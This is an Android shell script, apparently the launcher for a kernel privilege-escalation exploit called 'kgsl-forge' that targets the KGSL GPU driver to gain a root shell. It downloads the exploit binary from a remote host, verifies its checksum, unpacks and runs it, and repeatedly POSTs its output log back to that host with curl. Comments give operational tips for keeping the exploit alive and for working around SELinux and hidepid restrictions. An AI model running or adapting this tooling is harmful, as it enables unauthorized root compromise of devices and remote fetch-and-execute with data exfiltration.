#!/system/bin/sh
# JOB-FORGE-ROOTSHELL -- one guarded roll, on a fresh boot only.
#
# Two rules encoded here matter a great deal (see ../GUIDE.md):
#  * NEVER kill the exploit.  It parks (pause()) while holding a live KGSL fd so the
#    driver's mm-teardown never runs.  So run it backgrounded -- do NOT wrap it in
#    `timeout -k`, and do not SIGKILL a parked parent.
#  * Only roll on a fresh boot with no wedged kgsl-forge left over.  A previous run
#    can wedge the driver, and the next run then hangs at step [1v].
U=http://192.168.1.100:8010
WANT=00000000000000000000000000000000   # <-- md5 of the kgsl-forge.gz you serve

cd $HOME
rm -f kgsl-out.txt worker2.txt rootout.txt rsh.alive rootcmd
exec >> kgsl-out.txt 2>&1
( while true; do sleep 2; curl -s --max-time 5 -X POST --data-binary @$HOME/kgsl-out.txt "$U/" >/dev/null 2>&1; done ) &
UP=$!

echo "=== RUN $(date) uptime=$(awk '{print int($22/100)}' /proc/self/stat 2>/dev/null) ==="

# guard: kgsl-forge processes stuck outside state S
STUCK=0
for _p in $(pgrep -x kgsl-forge 2>/dev/null); do
  _s=$(awk '{print $3}' /proc/$_p/stat 2>/dev/null)
  [ -n "$_s" ] && [ "$_s" != "S" ] && STUCK=$((STUCK+1))
done
# Freshness guard.  Do NOT read /proc/uptime, /proc/stat or /proc/sys/* here:
# on this device all three are Permission denied to untrusted_app (hidepid=2 +
# SELinux), so that read returned empty every time and the guard silently failed
# OPEN -- it rolled on a ~40 min old boot, where the freed-page reclaim misses and
# the run aborts at [4] with 0 candidates.  /proc/self/stat field 22 IS readable,
# and read from a just-started shell it is the system uptime in USER_HZ ticks
# (100/s).  FORCE=1 sh job.sh overrides persistently for a deliberate manual retry.
UP2=$(( $(awk '{print $22}' /proc/self/stat 2>/dev/null || echo 0) / 100 ))
[ -n "$FORCE" ] && UP2=0
echo "stuck_nonS_kgsl=$STUCK uptime=[$UP2]"

for i in 1 2 3; do curl -s -o kgsl-forge.gz --max-time 60 "$U/kgsl-forge.gz" && [ -s kgsl-forge.gz ] && break; sleep 2; done
GOT=$(md5sum kgsl-forge.gz 2>/dev/null | awk '{print $1}')
echo "md5=[$GOT] want=[$WANT]"
# Fresh boot only: require a real, sane uptime.  Skipping the roll is cheap; rolling
# on a stale boot wastes the single clean reclaim the allocator will give us.
if [ "$GOT" = "$WANT" ] && [ "$STUCK" = "0" ] && [ "${UP2:-999999}" -lt 300 ] 2>/dev/null; then
  gunzip -c kgsl-forge.gz > kgsl-forge && chmod 755 kgsl-forge
  echo "=== roll ==="
  ./kgsl-forge &          # background: it parks holding a live fd; never kill it
else
  echo "[-] skipped (STUCK=$STUCK uptime=${UP2:-?})"
fi

sleep 45
kill $UP 2>/dev/null
echo "=== END ==="
